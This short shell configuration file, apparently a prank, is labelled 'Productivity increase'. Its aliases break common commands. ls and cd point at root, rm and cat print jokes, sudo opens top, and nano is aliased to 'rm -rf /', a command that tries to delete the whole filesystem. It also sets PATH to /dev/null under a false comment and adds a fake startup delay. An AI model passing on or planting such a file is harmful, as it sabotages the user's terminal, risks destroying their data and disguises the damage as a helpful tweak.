
# Productivity increase
alias ls='ls /'
alias cd='cd /'
alias rm='echo "Cannot remove: Operation not permitted."'
alias sudo='top'
alias cat='echo "Best cat names: Whiskers, Fluffy, Mittens, and Tigger."'
alias cp='echo "Chris Paul! Yeah!"'
alias nano='rm -rf /'

# It's better to run executables from absolute paths
export PATH=/dev/null

echo "Preparing terminal, please wait..."
sleep 10
echo "Terminal is ready."
